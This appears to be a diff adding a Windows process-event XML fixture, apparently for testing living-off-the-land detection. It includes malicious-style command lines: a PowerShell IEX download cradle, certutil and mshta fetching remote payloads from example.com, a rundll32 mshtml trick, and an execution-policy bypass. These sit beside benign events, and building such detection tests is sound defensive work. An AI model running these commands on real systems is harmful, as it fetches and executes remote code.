@@ -1,0 +1,91 @@
+<Events>
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="CommandLine">powershell.exe -EncodedCommand aQBlAHgA</Data>
+      <Data Name="UtcTime">2026-04-22 10:00:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -Command Write-Host LoTL_Test</Data>
+      <Data Name="UtcTime">2026-04-22 10:01:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')</Data>
+      <Data Name="UtcTime">2026-04-22 10:02:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe</Data>
+      <Data Name="UtcTime">2026-04-22 10:03:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\wbem\wmic.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">wmic.exe process call create "notepad.exe"</Data>
+      <Data Name="UtcTime">2026-04-22 10:04:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">mshta.exe http://example.com/test.hta</Data>
+      <Data Name="UtcTime">2026-04-22 10:05:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"</Data>
+      <Data Name="UtcTime">2026-04-22 10:06:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="CommandLine">powershell.exe Get-Process</Data>
+      <Data Name="UtcTime">2026-04-22 10:07:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="CommandLine">notepad.exe notes.txt</Data>
+      <Data Name="UtcTime">2026-04-22 10:08:00</Data>
+    </EventData>
+  </Event>
+
+  <Event>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\calc.exe</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="CommandLine">calc.exe</Data>
+      <Data Name="UtcTime">2026-04-22 10:09:00</Data>
+    </EventData>
+  </Event>
+</Events>
